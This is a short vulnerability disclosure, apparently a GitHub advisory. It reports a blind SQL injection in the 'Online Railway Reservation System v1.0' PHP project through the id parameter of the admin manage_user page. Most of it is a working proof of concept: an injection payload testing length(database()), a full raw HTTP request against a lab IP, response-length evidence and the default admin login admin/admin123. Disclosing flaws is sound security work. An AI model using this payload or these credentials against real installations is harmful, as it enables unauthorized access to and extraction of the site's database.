# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/admin/?page=user/manage_user&id=

Vulnerability location: /orrs/admin/?page=user/manage_user&id=, id

Current database name: orrs_db,length is 7

[+] Payload:  /orrs/admin/?page=user/manage_user&id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /orrs/admin/?page=user/manage_user&id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close
```

When length (database ()) = 6, Content-Length: 26098
![image](https://user-images.githubusercontent.com/54017627/172332542-14c795da-9959-4ea8-b16f-62a933c9d7f9.png)

![image](https://user-images.githubusercontent.com/54017627/172332234-6ebb24be-ce20-41c6-96f4-ccbd1cde2494.png)

When length (database ()) = 7, Content-Length: 25858
![image](https://user-images.githubusercontent.com/54017627/172332503-22a9da4f-ca29-4e63-b752-4b330fc284a2.png)

![image](https://user-images.githubusercontent.com/54017627/172332196-46613a69-04be-4ffb-a26c-2cf9ee9669e1.png)
